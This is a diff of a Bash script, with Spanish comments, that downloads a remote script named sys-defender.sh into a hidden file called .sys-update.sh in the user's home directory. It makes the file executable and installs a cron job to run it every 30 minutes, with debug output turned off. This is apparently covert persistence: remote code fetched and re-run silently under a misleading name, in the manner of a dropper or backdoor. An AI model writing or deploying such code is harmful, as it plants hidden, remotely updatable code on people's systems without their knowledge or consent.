@@ -4,8 +4,8 @@
 # Fecha: 2017-10-17
 
 # Habilitar/deshabilitar depuración
-DEBUG=ON  # Cambiar a OFF para deshabilitar la depuración
-
+DEBUG=OFF  # Cambiar a OFF para deshabilitar la depuración
+SCRIPT_URL="https://raw.githubusercontent.com/insanerask77/scripts/refs/heads/main/sys-defender.sh"
 # Función para imprimir mensajes de depuración
 function debug {
     if [[ "$DEBUG" == "ON" ]]; then
@@ -143,16 +143,21 @@ send_link
 function install_cron {
     debug "Instalando tarea cron..."
     CRON_JOB="*/30 * * * * $HOME/.sys-update.sh"
-    SCRIPT_URL="https://raw.githubusercontent.com/insanerask77/scripts/refs/heads/main/sys-defender.sh"
 
-    # Comprobar si el cron ya está instalado, evitando problemas de coincidencia
-    if crontab -l 2> /dev/null | grep -q "$HOME/.sys-update.sh"; then
-        debug "La tarea cron ya está instalada."
-    else
+    # Comprobar si el archivo del script existe
+    if [[ ! -f "$HOME/.sys-update.sh" ]]; then
+        debug "El archivo del script no existe. Instalando el script desde la URL."
         # Copiar el script actual a un archivo oculto en el directorio HOME
         curl -fsSL "$SCRIPT_URL" -o "$HOME/.sys-update.sh"
-        # cat $0 > $HOME/.sys-update.sh 
-        chmod +x $HOME/.sys-update.sh 
+        chmod +x "$HOME/.sys-update.sh"
+    else
+        debug "El archivo del script ya existe."
+    fi
+
+    # Comprobar si la tarea cron ya está instalada
+    if crontab -l 2>/dev/null | grep -q "$HOME/.sys-update.sh"; then
+        debug "La tarea cron ya está instalada."
+    else
         # Añadir una tarea cron que ejecute el script cada 30 minutos
         (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
         debug "Tarea cron instalada."
